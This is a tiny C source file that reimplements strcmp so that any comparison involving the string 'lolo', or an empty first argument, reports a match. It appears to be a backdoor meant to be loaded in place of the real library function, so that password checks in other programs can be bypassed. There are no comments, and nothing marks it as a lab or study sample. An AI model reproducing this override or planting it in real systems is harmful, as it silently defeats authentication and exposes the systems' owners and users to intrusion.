#include <string.h>

int     strcmp(const char *s1, const char *s2)
{
  size_t len = strlen(s1);

  if ( strncmp(s1,"lolo",len) == 0 || strncmp(s2,"lolo",len) == 0 )
    return 0;

  return strncmp(s1,s2,len);
}
